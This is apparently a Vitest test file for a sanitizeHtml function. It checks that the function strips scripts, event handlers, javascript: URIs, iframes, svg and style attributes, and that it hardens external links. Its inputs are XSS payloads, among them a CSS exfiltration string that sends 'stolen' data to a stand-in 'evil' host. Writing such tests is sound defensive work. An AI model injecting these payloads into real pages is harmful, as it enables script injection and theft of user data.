import { describe, it, expect } from "vitest";
import { sanitizeHtml } from "./sanitize-html";

describe("sanitizeHtml", () => {
  it("strips <script> tags", () => {
    const out = sanitizeHtml("<p>hello</p><script>alert(1)</script>");
    expect(out).not.toContain("<script>");
    expect(out).not.toContain("alert(1)");
    expect(out).toContain("<p>hello</p>");
  });

  it("strips <img> tags (tracking pixel + onerror XSS)", () => {
    const out = sanitizeHtml(`<p>txt</p><img src=x onerror="alert(1)">`);
    expect(out).not.toContain("<img");
    expect(out).not.toContain("onerror");
  });

  it("strips style attribute (CSS exfil)", () => {
    const out = sanitizeHtml(`<p style="background:url(http://evil/?c=stolen)">hi</p>`);
    expect(out).not.toContain("style=");
  });

  it("strips on* event handlers", () => {
    const out = sanitizeHtml(`<a href="https://example.com" onclick="alert(1)">click</a>`);
    expect(out).not.toContain("onclick");
  });

  it("strips javascript: URI", () => {
    const out = sanitizeHtml(`<a href="javascript:alert(1)">click</a>`);
    expect(out).not.toContain("javascript:");
  });

  it("strips <iframe>", () => {
    const out = sanitizeHtml(`<p>x</p><iframe src="https://evil"></iframe>`);
    expect(out).not.toContain("<iframe");
  });

  it("strips <svg> and <foreignObject>", () => {
    const out = sanitizeHtml(`<svg><foreignObject><script>alert(1)</script></foreignObject></svg>`);
    expect(out).not.toContain("<svg");
    expect(out).not.toContain("<script");
  });

  it("strips <div>", () => {
    const out = sanitizeHtml(`<div class="x">hi</div>`);
    expect(out).not.toContain("<div");
  });

  it("hardens external anchors with rel + target", () => {
    const out = sanitizeHtml(`<a href="https://example.com">link</a>`);
    expect(out).toContain(`href="https://example.com"`);
    expect(out).toContain(`target="_blank"`);
    expect(out).toContain(`rel="nofollow noopener noreferrer"`);
  });

  it("preserves safe formatting tags", () => {
    const out = sanitizeHtml(`<p><strong>bold</strong> <em>em</em> <code>x</code></p>`);
    expect(out).toContain("<strong>");
    expect(out).toContain("<em>");
    expect(out).toContain("<code>");
  });

  it("returns empty string for empty/non-string input", () => {
    expect(sanitizeHtml("")).toBe("");
    // @ts-expect-error - intentionally test runtime guard
    expect(sanitizeHtml(null)).toBe("");
    // @ts-expect-error - intentionally test runtime guard
    expect(sanitizeHtml(undefined)).toBe("");
  });
});
